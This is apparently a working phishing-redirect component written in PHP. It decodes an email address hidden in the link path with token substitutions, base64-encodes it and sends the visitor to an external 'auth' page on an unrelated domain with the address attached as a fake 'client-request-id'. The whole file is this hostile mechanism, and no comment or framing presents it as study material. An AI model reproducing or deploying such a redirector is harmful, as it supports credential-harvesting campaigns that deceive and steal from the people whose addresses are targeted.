<?php

$url = "$_SERVER[REQUEST_URI]";


$p0 = str_replace("/", "", $url);
$p1 = str_replace("-w8", "@", $p0);
$p2 = str_replace("-9a", ".", $p1);
$p3 = str_replace("-8p", "c", $p2);
$p4 = str_replace("-0d", "o", $p3);
$p5 = str_replace("(", "", $p4);
$p6 = str_replace(")", "", $p5);
$p7 = str_replace(" ", "", $p6);
$p8 = str_replace("%20", "", $p7);
$p9 = str_replace("9y-", "e", $p8);
$p10 = str_replace("  ", "", $p9);


$final = strtolower($p10);

function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://clubonerealtors.com/auth/?client-request-id=".base64_encode($final)."", false);

?>
